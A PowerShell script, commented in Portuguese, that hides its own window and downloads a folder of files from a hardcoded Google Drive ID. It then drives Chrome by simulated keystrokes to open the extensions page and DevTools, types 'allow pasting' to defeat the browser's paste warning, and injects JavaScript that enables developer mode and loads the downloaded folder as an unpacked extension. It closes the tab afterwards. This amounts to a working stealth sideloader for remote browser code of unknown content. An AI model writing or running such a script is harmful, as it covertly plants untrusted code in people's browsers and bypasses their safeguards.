$ProgressPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = 3072

# 1. Carrega APIs do Windows logo no início para minimizar o PS e focar o Chrome imediatamente
Add-Type -AssemblyName System.Windows.Forms
Add-Type -Name U -Namespace W -MemberDefinition '
public delegate bool P(IntPtr h,IntPtr l);
[DllImport("kernel32.dll")]public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]public static extern bool EnumWindows(P f,IntPtr l);
[DllImport("user32.dll")]public static extern bool EnumChildWindows(IntPtr p,P f,IntPtr l);
[DllImport("user32.dll",CharSet=CharSet.Unicode)]public static extern int GetWindowText(IntPtr h,System.Text.StringBuilder s,int n);
[DllImport("user32.dll",CharSet=CharSet.Unicode)]public static extern int GetClassName(IntPtr h,System.Text.StringBuilder s,int n);
[DllImport("user32.dll")]public static extern IntPtr GetForegroundWindow();
[DllImport("user32.dll")]public static extern bool IsWindowVisible(IntPtr h);
[DllImport("user32.dll")]public static extern bool IsIconic(IntPtr h);
[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h,int c);
[DllImport("user32.dll")]public static extern bool SetForegroundWindow(IntPtr h);
[DllImport("user32.dll")]public static extern IntPtr SendMessage(IntPtr h,uint m,IntPtr w,IntPtr l);
[DllImport("user32.dll",CharSet=CharSet.Unicode)]public static extern IntPtr SendMessage(IntPtr h,uint m,IntPtr w,string l);
'

# Minimiza a janela atual do PowerShell (6 = SW_MINIMIZE)
$console = [W.U]::GetConsoleWindow()
if ($console -ne [IntPtr]::Zero) { [void][W.U]::ShowWindow($console, 6) }

# Localiza ou abre o Chrome e já deixa ele em primeiro plano
$l = New-Object Collections.ArrayList
[void][W.U]::EnumWindows({
    param($h, $x)
    if ([W.U]::IsWindowVisible($h)) {
        $s = New-Object Text.StringBuilder 256
        [void][W.U]::GetWindowText($h, $s, 256)
        $t = $s.ToString()
        if ($t -match 'Google Chrome' -and $t -notmatch 'Inc[oó]gnit|An[oô]nim|InPrivate') {
            [void]$l.Add($h)
        }
    }
    $true
}, [IntPtr]::Zero)

if ($l.Count) {
    $h = $l[0]
    if ([W.U]::IsIconic($h)) { [void][W.U]::ShowWindow($h, 9) }
    [void][W.U]::SetForegroundWindow($h)
} else {
    Start-Process chrome
}

# 2. Mapeia e baixa os arquivos do Drive em segundo plano (8 threads)
$d = Join-Path ([Environment]::GetFolderPath("MyDocuments")) "gemini-ext"
$queue = [System.Collections.Concurrent.ConcurrentBag[hashtable]]::new()

function Map-Drive($i, $p) {
    md $p -Force | Out-Null
    foreach ($m in [regex]::Matches((iwr "https://drive.google.com/embeddedfolderview?id=$i" -UseBasicParsing).Content, 'id="entry-([^"]+)".*?href="([^"]+)".*?class="flip-entry-title">([^<]+)<', 'Singleline')) {
        $n = [Net.WebUtility]::HtmlDecode($m.Groups[3].Value).Trim()
        if ($m.Groups[2].Value -match "/folders/") {
            Map-Drive $m.Groups[1].Value (Join-Path $p $n)
        } else {
            $queue.Add(@{ id = $m.Groups[1].Value; out = (Join-Path $p $n) })
        }
    }
}

if (Test-Path $d) { rm $d -Recurse -Force }
Map-Drive "1CdKhPXYNQGMvGUn0BZfJzfgFM3itycNq" $d

$pool = [RunspaceFactory]::CreateRunspacePool(1, 8)
$pool.Open()
$jobs = foreach ($item in $queue) {
    $ps = [PowerShell]::Create().AddScript({
        param($id, $out)
        [Net.ServicePointManager]::SecurityProtocol = 3072
        (New-Object Net.WebClient).DownloadFile("https://drive.usercontent.google.com/download?id=$id&export=download&confirm=t", $out)
    }).AddArgument($item.id).AddArgument($item.out)
    $ps.RunspacePool = $pool
    @{ ps = $ps; handle = $ps.BeginInvoke() }
}
foreach ($j in $jobs) { $j.ps.EndInvoke($j.handle); $j.ps.Dispose() }
$pool.Close(); $pool.Dispose()

# 3. Garante foco no Chrome, abre chrome://extensions/ e injeta o JS
if ($l.Count) {
    if ([W.U]::IsIconic($h)) { [void][W.U]::ShowWindow($h, 9) }
    [void][W.U]::SetForegroundWindow($h)
    sleep -m 150
    [Windows.Forms.SendKeys]::SendWait("^t")
    sleep -m 150
    [Windows.Forms.SendKeys]::SendWait("chrome://extensions/{ENTER}")
} else {
    Start-Process chrome "chrome://extensions/"
    sleep -m 500
}

$sw = [Diagnostics.Stopwatch]::StartNew()
while ($sw.ElapsedMilliseconds -lt 4000) {
    $fg = [W.U]::GetForegroundWindow()
    $s = New-Object Text.StringBuilder 256
    [void][W.U]::GetWindowText($fg, $s, 256)
    if ($s.ToString() -match 'Extens[õo]es|Extensions') { break }
    sleep -m 50
}

[Windows.Forms.SendKeys]::SendWait("^+j")
sleep -m 650

$js = 'const m=document.querySelector("extensions-manager").shadowRoot;const t=m.querySelector("extensions-toolbar").shadowRoot;const dev=t.querySelector("#devMode");if(!dev.checked)dev.click();t.querySelector("#loadUnpacked").click();'
Set-Clipboard $js
[Windows.Forms.SendKeys]::SendWait("^v{ENTER}")

function Wait-FileDialog($timeoutMs) {
    $w = [Diagnostics.Stopwatch]::StartNew()
    while ($w.ElapsedMilliseconds -lt $timeoutMs) {
        $fg = [W.U]::GetForegroundWindow()
        $cls = New-Object Text.StringBuilder 256
        [void][W.U]::GetClassName($fg, $cls, 256)
        if ($cls.ToString() -eq "#32770") { return $fg }
        sleep -m 40
    }
    return [IntPtr]::Zero
}

$dlg = Wait-FileDialog 650
if ($dlg -eq [IntPtr]::Zero) {
    [Windows.Forms.SendKeys]::SendWait("allow pasting{ENTER}")
    sleep -m 150
    Set-Clipboard $js
    [Windows.Forms.SendKeys]::SendWait("^v{ENTER}")
    $dlg = Wait-FileDialog 3000
}

# 4. Seleciona a pasta via Win32 e fecha a aba de extensões
if ($dlg -ne [IntPtr]::Zero) {
    $script:edit = [IntPtr]::Zero
    $script:btn = [IntPtr]::Zero

    [void][W.U]::EnumChildWindows($dlg, {
        param($ch, $x)
        $cls = New-Object Text.StringBuilder 256
        [void][W.U]::GetClassName($ch, $cls, 256)
        $c = $cls.ToString()
        if ($c -eq "Edit") {
            $script:edit = $ch
        } elseif ($c -eq "Button") {
            $txt = New-Object Text.StringBuilder 256
            [void][W.U]::GetWindowText($ch, $txt, 256)
            if (($txt.ToString() -replace '&', '') -match 'Selecionar pasta|Select Folder') {
                $script:btn = $ch
            }
        }
        $true
    }, [IntPtr]::Zero)

    if ($script:edit -ne [IntPtr]::Zero) {
        [void][W.U]::SendMessage($script:edit, 0x000C, [IntPtr]::Zero, $d)
    }
    if ($script:btn -ne [IntPtr]::Zero) {
        [void][W.U]::SendMessage($script:btn, 0x00F5, [IntPtr]::Zero, [IntPtr]::Zero)
    }

    $wClose = [Diagnostics.Stopwatch]::StartNew()
    while ($wClose.ElapsedMilliseconds -lt 2000 -and [W.U]::IsWindowVisible($dlg)) {
        sleep -m 40
    }

    sleep -m 150
    $fg = [W.U]::GetForegroundWindow()
    $s = New-Object Text.StringBuilder 256
    [void][W.U]::GetWindowText($fg, $s, 256)
    if ($s.ToString() -match 'Extens[õo]es|Extensions') {
        [Windows.Forms.SendKeys]::SendWait("^w")
    }
}

exit